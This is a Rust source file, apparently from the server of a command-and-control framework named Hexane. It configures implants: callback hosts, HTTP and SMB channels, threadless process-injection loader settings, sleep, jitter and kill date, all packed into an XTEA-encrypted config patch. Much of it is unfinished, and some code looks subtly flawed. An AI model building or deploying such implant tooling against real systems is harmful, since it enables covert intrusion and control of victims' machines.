use rand::Rng;
use std::str::FromStr;

use crate::server::INSTANCES;
use crate::server::session::{SESSION, USERAGENT};
use crate::server::types::{InjectionOptions, NetworkOptions, TRANSPORT_PIPE, TRANSPORT_HTTP, Config, Compiler, Network, Builder, Loader, UserSession};
use crate::server::cipher::{crypt_create_key, crypt_xtea};
use crate::server::error::{Error, Result};
use crate::server::utils::wrap_message;
use crate::server::config::map_config;
use crate::server::stream::Stream;

use crate::{return_error, length_check_defer};

const BUILD_DLL: u32 = 0;
const BUILD_SHC: u32 = 1;


pub fn get_config_by_name<'a> (name: &str) -> Result<&'a Hexane> {
    let instances = INSTANCES.lock().unwrap();

    for instance in instances.iter() {
        if instance.builder.output_name.as_str() == name {
            return Ok(instance);
        }
    }
    return_error!("instance {name} not found")
}

pub fn get_config_by_pid<'a> (pid: u32) -> Result<&'a Hexane> {
    let instances = INSTANCES.lock().unwrap();

    for instance in instances.iter() {
        if instance.peer_id == pid {
            return Ok(instance);
        }
    }
    return_error!("instance {pid} not found")
}

pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
    length_check_defer!(args, 3);

    let mut instance = match map_config(&args[2]) {
        Ok(instance)    => instance,
        Err(e)          => return Err(e),
    };

    instance.setup_instance()?;

    let ref session = SESSION.lock().unwrap();
    instance.user_session.username = session.username.clone();
    instance.user_session.is_admin = session.is_admin.clone();

    if instance.network_type != *TRANSPORT_PIPE {
        instance.setup_listener()?;
    }

    wrap_message("info", format!("{} is ready", instance.builder.output_name));
    INSTANCES.lock().unwrap().push(instance);
    // todo: insert to db

    Ok(())
}

pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
    length_check_defer!(args, 3);

    let mut instances = INSTANCES.lock().map_err(|e| e.to_string())?;
    if let Some(pos) = instances.iter().position(|instance| instance.builder.output_name == args[2]) {

        wrap_message("info", format!("{} removed", instances[pos].builder.output_name));
        instances.remove(pos);
        // todo: remove from db

        Ok(())
    } else {
        return_error!("Implant not found")
    }
}


pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
    todo!()
    // todo: get channels + saved messages from db
}

#[derive(Debug)]
pub struct Hexane {
    pub(crate) current_taskid:  u32,
    pub(crate) peer_id:         u32,
    pub(crate) group_id:        u32,
    pub(crate) build_type:      u32,

    pub(crate) crypt_key:       Vec<u8>,
    pub(crate) shellcode:       Vec<u8>,
    pub(crate) config_data:     Vec<u8>,
    pub(crate) network_type:    u8,
    pub(crate) active:          bool,

    pub(crate) main:            Config,
    pub(crate) compiler:        Compiler,
    pub(crate) network:         Network,
    pub(crate) builder:         Builder,
    pub(crate) loader:          Option<Loader>,
    pub(crate) user_session:    UserSession,
}
impl Hexane {
    fn setup_instance(&mut self) -> Result<()> {
        let mut rng = rand::thread_rng();

        self.peer_id = rng.random::<u32>();
        self.group_id = 0;

        if self.main.debug {
            self.compiler.compiler_flags = String::from("-std=c++23 -g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin -Wl,--no-seh,--enable-stdcall-fixup,--gc-sections");
        } else {
            self.compiler.compiler_flags = String::from("-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC  -fno-builtin -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections");
        }

        self.check_config()?;
        self.generate_config_bytes()?;

        // todo: build process
        // todo: add config db write/delete

        Ok(())
    }

    fn generate_config_bytes(&mut self) -> Result<()> {
        self.crypt_key = crypt_create_key(16);

        let mut patch = self.create_binary_patch()?;
        if self.main.encrypt {
            let patch_cpy = patch.clone();
            patch = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
        }

        self.config_data = patch;
        Ok(())
    }

    fn setup_listener(&mut self) -> Result<()> {
        // todo: listener setup
        Ok(())
    }

    fn check_config(&mut self) -> Result<()> {
        if self.main.hostname.is_empty()            { return_error!("a valid hostname must be provided") }
        if self.main.architecture.is_empty()        { return_error!("a valid architecture must be provided") }

        if self.builder.output_name.is_empty()      { return_error!("a name for the build must be provided") }
        if self.builder.root_directory.is_empty()   { return_error!("a root directory for implant files must be provided") }

        if let Some(linker_script) = &self.builder.linker_script {
            if linker_script.is_empty() { return_error!("linker_script field found but linker script path must be provided") }
        }

        if let Some(modules) = &self.builder.loaded_modules {
            if modules.is_empty() { return_error!("loaded_modules field found but module names must be provided") }
        }

        if let Some(deps) = &self.builder.dependencies {
            if deps.is_empty() { return_error!("builder dependencies field found but dependencies must be provided") }
        }

        if let Some(inc) = &self.builder.include_directories {
            if inc.is_empty() { return_error!("builder include_directories field found but include directories must be provided") }
        }

        match &mut self.network.options {
            NetworkOptions::Http(http) => {
                if http.address.is_empty()      { return_error!("a valid return url must be provided") }
                if http.endpoints.is_empty()    { return_error!("at least one valid endpoint must be provided") }
                if http.useragent.is_none()     { http.useragent = Some(USERAGENT.to_string()); }

                if let Some(headers) = &http.headers {
                    if headers.is_empty() { return_error!("http header field found but names must be provided") }
                }

                if let Some(domain) = &http.domain {
                    if domain.is_empty() { return_error!("domain name field found but domain name must be provided") }
                }

                // todo: proxy should not be exclusive to http (socks5, ftp, smtp etc)
                if let Some(proxy) = &http.proxy {
                    if proxy.address.is_empty() { return_error!("proxy field detected but proxy address must be provided") }
                    if proxy.proto.is_empty()   { return_error!("proxy protocol must be provided") }

                    if let Some(username) = &proxy.username {
                        if username.is_empty() { return_error!("proxy username field detected but the username was not provided") }
                    }

                    if let Some(password) = &proxy.password {
                        if password.is_empty() { return_error!("proxy password field detected but the password was not provided") }
                    }
                }
            },

            NetworkOptions::Smb(smb) => {
                if smb.egress_peer.is_empty() { return_error!("an implant type of smb must provide the name of it's parent node") }
            }
        }

        if let Some(loader) = &mut self.loader {
            self.build_type = BUILD_DLL;

            if loader.root_directory.is_empty() { return_error!("loader field detected but root_directory must be provided")}
            if loader.sources.is_empty()        { return_error!("loader field detected but sources must be provided")}
            if loader.rsrc_script.is_empty()    { return_error!("loader field detected but rsrc_script must be provided")}

            if let Some(linker) = &loader.linker_script {
                if linker.is_empty() { return_error!("loader ld field detected but linker script must be provided")}
            }

            if let Some(deps) = &loader.dependencies {
                if deps.is_empty() { return_error!("loader dependencies field found but dependencies must be provided") }
            }

            match &mut loader.injection.options {
                InjectionOptions::Threadless(threadless) => {
                    if threadless.execute_object.is_empty()     { return_error!("loader field detected 'threadless' injection but an execute_object must be provided")}
                    if threadless.loader_assembly.is_empty()    { return_error!("loader field detected 'threadless' injection but a loader_assembly must be provided")}
                    if threadless.target_process.is_empty()     { return_error!("loader field detected 'threadless' injection but a target_process must be provided")}
                    if threadless.target_module.is_empty()      { return_error!("loader field detected 'threadless' injection but a target_module must be provided")}
                    if threadless.target_function.is_empty()    { return_error!("loader field detected 'threadless' injection but a target_function must be provided")}
                },
                InjectionOptions::Threadpool(_) => {
                    return_error!("threadpool injection not yet supported")
                }
            }
        } else {
            self.build_type = BUILD_SHC;
        }

        Ok(())
    }

    fn create_binary_patch(&self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        if self.network_type == *TRANSPORT_HTTP {
            stream.pack_byte(*TRANSPORT_HTTP);
        } else if self.network_type == *TRANSPORT_PIPE {
            stream.pack_byte(*TRANSPORT_PIPE);
        } else {
            return_error!("invalid network type")
        }

        if self.main.architecture == "amd64" {
            stream.pack_dword(1);
        } else {
            stream.pack_dword(0);
        }

        if let Some(modules) = &self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        }

        stream.pack_bytes(&self.crypt_key);
        stream.pack_string(&self.main.hostname);

        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main.sleeptime);
        stream.pack_dword(self.main.jitter as u32);

        if let Some(ref modules) = self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        }

        let working_hours = if let Some(ref hours) = self.main.working_hours {
            i32::from_str(hours).map_err(Error::ParseInt)?
        } else {
            0
        };

        let kill_date = if let Some(ref date) = self.main.killdate {
            i64::from_str(date).map_err(Error::ParseInt)?
        } else {
            0
        };

        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        match &self.network.options {
            NetworkOptions::Http(ref http) => {
                stream.pack_wstring(http.useragent.as_ref().unwrap().as_str());
                stream.pack_wstring(&http.address);
                stream.pack_dword(http.port as u32);
                stream.pack_dword(http.endpoints.len() as u32);

                for endpoint in &http.endpoints {
                    stream.pack_wstring(endpoint);
                }

                stream.pack_string(http.domain.as_ref().unwrap().as_str());

                if let Some(ref proxy) = http.proxy {
                    let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
                    stream.pack_dword(1);
                    stream.pack_wstring(&proxy_url);
                    stream.pack_wstring(proxy.username.as_ref().unwrap().as_str());
                    stream.pack_wstring(proxy.password.as_ref().unwrap().as_str());
                } else {
                    stream.pack_dword(0);
                }
            }
            NetworkOptions::Smb(ref smb) => {
                stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
            }
        }

        Ok(stream.buffer)
    }
}

